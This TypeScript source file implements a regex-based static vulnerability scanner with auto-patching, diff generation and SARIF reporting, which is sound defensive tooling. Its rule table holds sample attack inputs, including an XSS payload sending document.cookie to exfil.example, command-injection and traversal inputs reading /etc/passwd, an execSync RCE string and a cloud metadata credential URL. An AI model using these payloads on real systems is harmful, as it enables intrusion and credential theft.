import type { Severity } from '../types/ide';

export interface StaticFinding {
  id: string;
  ruleId: string;
  title: string;
  category: string;
  severity: Severity;
  cwe: string;
  filePath: string;
  line: number;
  column: number;
  matchedLine: string;
  redAgent: string;
  blueAgent: string;
  attackVector: string;
  impact: string;
  remediation: string;
  patchedLine: string;
}

export interface SarifLog {
  $schema: string;
  version: string;
  runs: Array<{
    tool: {
      driver: {
        name: string;
        version: string;
        informationUri: string;
        rules: Array<{
          id: string;
          name: string;
          shortDescription: { text: string };
          helpUri: string;
          properties: { cwe: string; severity: Severity };
        }>;
      };
    };
    results: Array<{
      ruleId: string;
      level: 'error' | 'warning' | 'note';
      message: { text: string };
      locations: Array<{
        physicalLocation: {
          artifactLocation: { uri: string };
          region: { startLine: number; startColumn: number };
        };
      }>;
    }>;
  }>;
}

interface ScannerRule {
  ruleId: string;
  title: string;
  category: string;
  severity: Severity;
  cwe: string;
  redAgent: string;
  blueAgent: string;
  pattern: RegExp;
  attackVector: string;
  impact: string;
  remediation: string;
  patchLine: (line: string) => string;
}

const SCANNER_RULES: ScannerRule[] = [
  {
    ruleId: 'RTA-SQLI-001',
    title: 'SQL Injection via String Interpolation',
    category: 'Injection',
    severity: 'critical',
    cwe: 'CWE-89',
    redAgent: 'Red · SQLi-Agent',
    blueAgent: 'Blue · Query-Guard',
    pattern:
      /(?:\.(?:query|execute|raw|all|get)\s*\(\s*(?:`[^`]*\$\{|['"][^'"]*['"]\s*\+)|(?:SELECT|INSERT|UPDATE|DELETE)\b[^;\n]*(?:\$\{|\+\s*(?:req\.|user|id|email|input)))/i,
    attackVector: "' OR '1'='1' --",
    impact: 'Attacker-controlled input alters SQL query syntax, enabling auth bypass or full table dump.',
    remediation: 'Use parameterized prepared statements with bound placeholders (?) instead of string concatenation.',
    patchLine: (line) =>
      line
        .replace(/`([^`]*)\$\{[^}]+\}([^`]*)`/g, "'$1?$2', [sanitizedParam]")
        .replace(
          /(['"])([^'"]*)\1\s*\+\s*([a-zA-Z0-9_.]+)(?:\s*\+\s*['"][^'"]*['"])?/g,
          '$1$2?$1, [$3]'
        ),
  },
  {
    ruleId: 'RTA-XSS-002',
    title: 'DOM Cross-Site Scripting (Unsafe HTML Sink)',
    category: 'Cross-Site Scripting',
    severity: 'critical',
    cwe: 'CWE-79',
    redAgent: 'Red · XSS-Prober',
    blueAgent: 'Blue · Sanitizer',
    pattern:
      /(?:\.innerHTML\s*=|\.outerHTML\s*=|document\.write\s*\(|dangerouslySetInnerHTML\s*=|res\.send\s*\(\s*['"`][^'"`]*<[^>]+>[^'"`]*['"`]\s*\+)/i,
    attackVector: '<img src=x onerror="fetch(\'https://exfil.example/?c=\'+document.cookie)">',
    impact: 'Untrusted input renders as executable HTML/JS in the victim browser origin.',
    remediation: 'Use textContent, React text interpolation, or escapeHtml() / DOMPurify before rendering.',
    patchLine: (line) =>
      line
        .replace(/\.innerHTML\s*=\s*([^;]+)/g, '.textContent = escapeHtml($1)')
        .replace(/dangerouslySetInnerHTML=\{\{\s*__html:\s*([^}]+)\}\}/g, 'children={escapeHtml($1)}'),
  },
  {
    ruleId: 'RTA-CMD-003',
    title: 'OS Command Injection Risk',
    category: 'Injection',
    severity: 'critical',
    cwe: 'CWE-78',
    redAgent: 'Red · Shell-Fuzzer',
    blueAgent: 'Blue · Exec-Guard',
    pattern: /(?:child_process|exec|execSync|spawnSync|os\.system|subprocess\.run)\s*\([^)]*(?:\$\{|\+|req\.|shell\s*:\s*true)/i,
    attackVector: '; cat /etc/passwd #',
    impact: 'Arbitrary shell commands can execute on the host container with server privileges.',
    remediation: 'Use execFile/spawn with an explicit argument array and shell: false, plus input allowlisting.',
    patchLine: (line) => line.replace(/execSync\s*\(/g, 'execFileSync(/* allowlisted bin, args[], { shell: false } */ ') + ' // hardened: avoid shell interpolation',
  },
  {
    ruleId: 'RTA-EVAL-004',
    title: 'Dynamic Code Execution via eval() or Function()',
    category: 'Code Injection',
    severity: 'critical',
    cwe: 'CWE-94',
    redAgent: 'Red · RCE-Prober',
    blueAgent: 'Blue · Runtime-Lock',
    pattern: /\b(?:eval|new\s+Function)\s*\(/,
    attackVector: 'process.mainModule.require("child_process").execSync("id")',
    impact: 'Evaluating untrusted strings leads directly to arbitrary JavaScript execution.',
    remediation: 'Replace eval()/Function() with JSON.parse() or a safe declarative expression parser.',
    patchLine: (line) => line.replace(/\beval\s*\(/g, 'JSON.parse('),
  },
  {
    ruleId: 'RTA-PATH-005',
    title: 'Arbitrary File Read / Path Traversal',
    category: 'Path Traversal',
    severity: 'high',
    cwe: 'CWE-22',
    redAgent: 'Red · Path-Crawler',
    blueAgent: 'Blue · FS-Sandbox',
    pattern: /(?:readFile|readFileSync|sendFile|createReadStream)\s*\([^)]*(?:req\.|params\.|query\.|\$\{|\+)/i,
    attackVector: '../../etc/passwd',
    impact: 'Directory traversal sequences escape intended asset root and expose server files.',
    remediation: 'Resolve canonical path with path.resolve(BASE_DIR, safeName) and verify prefix startsWith(BASE_DIR).',
    patchLine: (line) => `${line} // TODO: enforce path.resolve(SAFE_ROOT, path.basename(input))`,
  },
  {
    ruleId: 'RTA-SSRF-006',
    title: 'Server-Side Request Forgery (Unvalidated Outbound Fetch)',
    category: 'SSRF',
    severity: 'high',
    cwe: 'CWE-918',
    redAgent: 'Red · SSRF-Scout',
    blueAgent: 'Blue · Egress-Filter',
    pattern: /\b(?:fetch|axios\.(?:get|post|request))\s*\(\s*(?:req\.(?:query|body|params)|[a-zA-Z0-9_]*url[a-zA-Z0-9_]*)/i,
    attackVector: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    impact: 'Allows probing internal VPC services and cloud metadata endpoints from the backend server.',
    remediation: 'Validate URL protocol (https:) and enforce an explicit hostname allowlist before outbound fetch.',
    patchLine: (line) => `${line} /* verify outbound URL host allowlist */`,
  },
  {
    ruleId: 'RTA-REDIR-007',
    title: 'Unvalidated Open Redirect',
    category: 'Input Validation',
    severity: 'medium',
    cwe: 'CWE-601',
    redAgent: 'Red · Redirect-Scout',
    blueAgent: 'Blue · URL-Validator',
    pattern: /(?:res\.redirect\s*\(|window\.location(?:\.href)?\s*=)\s*(?:String\s*\()?\s*(?:req\.(?:query|body|params)|nextUrl|redirectUrl)/i,
    attackVector: 'https://evil.phish.example/reauth',
    impact: 'Phishing links hosted on your trusted domain silently bounce users to attacker-controlled sites.',
    remediation: 'Allow only relative paths starting with "/" (excluding "//") or strictly allowlisted hostnames.',
    patchLine: (line) =>
      line.replace(
        /res\.redirect\s*\(([^)]+)\)/,
        "res.redirect(isSafeRelativePath($1) ? $1 : '/dashboard')"
      ),
  },
  {
    ruleId: 'RTA-SECRET-008',
    title: 'Hardcoded Secret or Private Credential in Source',
    category: 'Secrets Management',
    severity: 'critical',
    cwe: 'CWE-798',
    redAgent: 'Red · Secret-Sniffer',
    blueAgent: 'Blue · Vault-Shield',
    pattern:
      /(?:sk_live_[0-9a-zA-Z]{8,}|AKIA[0-9A-Z]{16}|(?:jwt_?secret|api_?key|db_?password|private_?key)\s*[:=]\s*['"][^'"]{6,}['"])/i,
    attackVector: 'Read static bundle / repository commit history to extract live credentials.',
    impact: 'Exposed secrets grant unauthorized access to payment gateways, databases, or signing keys.',
    remediation: 'Load secrets exclusively from process.env at runtime and rotate compromised credentials.',
    patchLine: (line) =>
      line.replace(/(['"][^'"]{6,}['"])/, "process.env.APP_SECRET ?? '' /* moved to runtime env */"),
  },
  {
    ruleId: 'RTA-CRYPTO-009',
    title: 'Weak Cryptographic Hash (MD5 / SHA-1)',
    category: 'Cryptography',
    severity: 'medium',
    cwe: 'CWE-328',
    redAgent: 'Red · Crypto-Auditor',
    blueAgent: 'Blue · Hash-Hardener',
    pattern: /createHash\s*\(\s*['"](?:md5|sha1)['"]\s*\)/i,
    attackVector: 'Precomputed rainbow table / collision attack against weak digest.',
    impact: 'Fast legacy digests allow rapid offline cracking of passwords or signature forgery.',
    remediation: 'Use Argon2id / bcrypt / scrypt for passwords or SHA-256+ for integrity digests.',
    patchLine: (line) => line.replace(/['"](?:md5|sha1)['"]/i, "'sha256'"),
  },
  {
    ruleId: 'RTA-LOGIC-010',
    title: 'Client-Controlled Price or Total Accepted Directly',
    category: 'Business Logic',
    severity: 'high',
    cwe: 'CWE-602',
    redAgent: 'Red · Logic-Breaker',
    blueAgent: 'Blue · Auth-Guard',
    pattern: /(?:req\.body\.(?:price|total|clientTotal|amount)|Number\s*\(\s*req\.body\.(?:price|total|clientTotal|amount)\s*\))/i,
    attackVector: '{"sku":"pro-plan","clientTotal":0.01}',
    impact: 'Buyers can manipulate checkout totals to $0.01 before payment authorization.',
    remediation: 'Compute authoritative line-item pricing exclusively from server-side catalog records.',
    patchLine: (line) => line.replace(/req\.body\.(?:price|total|clientTotal|amount)/gi, 'CATALOG[req.body.sku].price'),
  },
];

export function scanSourceCode(code: string, filePath = 'target.ts'): StaticFinding[] {
  const lines = code.split(/\r?\n/);
  const findings: StaticFinding[] = [];
  let counter = 1;

  lines.forEach((rawLine, idx) => {
    const trimmed = rawLine.trim();
    if (!trimmed || trimmed.startsWith('//') || trimmed.startsWith('*')) {
      return;
    }

    for (const rule of SCANNER_RULES) {
      const match = rule.pattern.exec(rawLine);
      if (match) {
        findings.push({
          id: `static-${counter++}`,
          ruleId: rule.ruleId,
          title: rule.title,
          category: rule.category,
          severity: rule.severity,
          cwe: rule.cwe,
          filePath,
          line: idx + 1,
          column: (match.index ?? 0) + 1,
          matchedLine: trimmed,
          redAgent: rule.redAgent,
          blueAgent: rule.blueAgent,
          attackVector: rule.attackVector,
          impact: rule.impact,
          remediation: rule.remediation,
          patchedLine: rule.patchLine(rawLine),
        });
      }
    }
  });

  return findings;
}

export function buildPatchedCodeFromFindings(code: string, findings: StaticFinding[]): string {
  const lines = code.split(/\r?\n/);
  const linePatchMap = new Map<number, string>();
  for (const f of findings) {
    if (!linePatchMap.has(f.line)) {
      linePatchMap.set(f.line, f.patchedLine);
    }
  }
  return lines
    .map((line, index) => linePatchMap.get(index + 1) ?? line)
    .join('\n');
}

export function generateUnifiedDiff(
  filePath: string,
  originalCode: string,
  patchedCode: string
): string {
  const a = originalCode.split(/\r?\n/);
  const b = patchedCode.split(/\r?\n/);
  const n = a.length;
  const m = b.length;

  // Compute Longest Common Subsequence DP table
  const dp: number[][] = Array.from({ length: n + 1 }, () =>
    new Array<number>(m + 1).fill(0)
  );
  for (let i = n - 1; i >= 0; i--) {
    for (let j = m - 1; j >= 0; j--) {
      if (a[i] === b[j]) {
        dp[i][j] = dp[i + 1][j + 1] + 1;
      } else {
        dp[i][j] = Math.max(dp[i + 1][j], dp[i][j + 1]);
      }
    }
  }

  const hunks: string[] = [
    `--- a/${filePath}`,
    `+++ b/${filePath}`,
    `@@ -1,${n} +1,${m} @@`,
  ];

  let i = 0;
  let j = 0;
  while (i < n && j < m) {
    if (a[i] === b[j]) {
      hunks.push(` ${a[i]}`);
      i++;
      j++;
    } else if (dp[i + 1][j] >= dp[i][j + 1]) {
      hunks.push(`-${a[i]}`);
      i++;
    } else {
      hunks.push(`+${b[j]}`);
      j++;
    }
  }
  while (i < n) {
    hunks.push(`-${a[i++]}`);
  }
  while (j < m) {
    hunks.push(`+${b[j++]}`);
  }

  return hunks.join('\n');
}

export function generateSarifReport(
  targetName: string,
  filePath: string,
  findings: Array<{
    ruleId?: string;
    id: string;
    title: string;
    cwe: string;
    severity: Severity;
    line?: number;
    column?: number;
    impact?: string;
    impactSummary?: string;
  }>
): SarifLog {
  const rulesMap = new Map<
    string,
    {
      id: string;
      name: string;
      shortDescription: { text: string };
      helpUri: string;
      properties: { cwe: string; severity: Severity };
    }
  >();

  for (const f of findings) {
    const rId = f.ruleId || f.id;
    if (!rulesMap.has(rId)) {
      const cweNum = f.cwe.replace(/[^0-9]/g, '') || '79';
      rulesMap.set(rId, {
        id: rId,
        name: f.title,
        shortDescription: { text: f.title },
        helpUri: `https://cwe.mitre.org/data/definitions/${cweNum}.html`,
        properties: { cwe: f.cwe, severity: f.severity },
      });
    }
  }

  return {
    $schema:
      'https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json',
    version: '2.1.0',
    runs: [
      {
        tool: {
          driver: {
            name: `RedTeam Swarm Arena (${targetName})`,
            version: '1.0.0',
            informationUri: 'https://owasp.org/www-project-top-ten/',
            rules: Array.from(rulesMap.values()),
          },
        },
        results: findings.map((f) => ({
          ruleId: f.ruleId || f.id,
          level:
            f.severity === 'critical' || f.severity === 'high' ? 'error' : 'warning',
          message: {
            text: `${f.title} (${f.cwe}): ${f.impact || f.impactSummary || 'Vulnerability detected'}`,
          },
          locations: [
            {
              physicalLocation: {
                artifactLocation: { uri: filePath },
                region: {
                  startLine: f.line ?? 1,
                  startColumn: f.column ?? 1,
                },
              },
            },
          ],
        })),
      },
    ],
  };
}
